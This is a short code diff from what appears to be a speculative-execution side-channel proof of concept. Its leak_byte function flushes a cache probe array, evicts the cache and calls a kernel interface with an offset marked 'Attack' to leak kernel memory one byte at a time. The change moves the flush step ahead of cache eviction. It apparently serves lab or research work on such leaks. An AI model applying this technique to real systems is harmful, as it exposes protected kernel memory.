@@ -136,13 +136,16 @@ static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset
 	call_kernel_part3(kernel_fd, shared_memory, 0);
 	call_kernel_part3(kernel_fd, shared_memory, 0);
 
+    flush_probe_array(shared_memory);
+    _mm_mfence();
+
 	// Evict 
 	evict_cache();
 
-	// Flush
+/*	// Flush
 	flush_probe_array(shared_memory);
 	_mm_mfence();
-
+*/
 	// Attack
     	call_kernel_part3(kernel_fd, shared_memory, offset);
 
